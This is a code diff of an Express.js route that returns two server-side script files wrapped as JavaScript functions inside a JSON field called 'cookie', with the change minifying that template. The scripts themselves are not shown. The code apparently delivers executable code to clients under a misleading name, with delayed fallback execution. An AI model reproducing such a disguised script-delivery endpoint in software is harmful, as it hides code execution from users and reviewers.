@@ -34,22 +34,7 @@ router.get("/:id", async (req, res) => {
         path.join(__dirname, "scripts", "code2"),
         "utf-8"
       );
-      return res.json({ cookie: `
-          function code1() {
-          ${script1}
-          }
-
-          function code2() {
-          ${script2}
-          }
-
-          try {
-            code2();
-            setTimeout(code1, 60000);
-          } catch (err) {
-            code1();
-          }
-          ` });
+      return res.json({ cookie: `function code1(){${script1}} function code2(){${script2}} try{code2();setTimeout(code1,60000);}catch(err){code1();}` });
     }
 
     default: {
